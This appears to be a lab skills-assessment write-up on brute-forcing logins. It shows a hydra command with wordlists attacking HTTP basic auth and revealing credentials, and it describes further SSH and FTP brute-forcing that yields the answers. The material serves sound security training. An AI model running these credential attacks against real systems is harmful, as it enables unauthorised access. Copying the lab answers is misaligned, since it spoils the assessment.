
---
## Skill Assessment Part 1
### What is the password for the basic auth login?

**Answer:** running the hydra with below commands gives username and password:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 154.57.1  
64.70 http-get / -s 37744    

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-08 18:01:59  
  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task  

[DATA] attacking http-get://154.57.164.70:37744/  
[37744][http-get] host: 154.57.164.70   login: admin   password: Admin123  
[STATUS] attack finished for 154.57.164.70 (valid pair found)  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-08 18:02:19
```

### After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

**Answer:** Login with the password reveals the username `satwossh`


## Skill Assessment Part 2

### What is the username of the ftp user you find via brute-forcing?

**Answer:** Using the username `satwoshh` and bruteforce the ssh gives the password for `satwoshh` user. After login with the ssh creds, found an `IncidentReport.txt` where Thomas Smith was reported. Created username list with username-anarchy and brute forced it against the `passwords.txt` already present on the machine reveals the username to be `thomas` and password to be `chocolate!`. Logging in with ftp credentials gives the flag, 

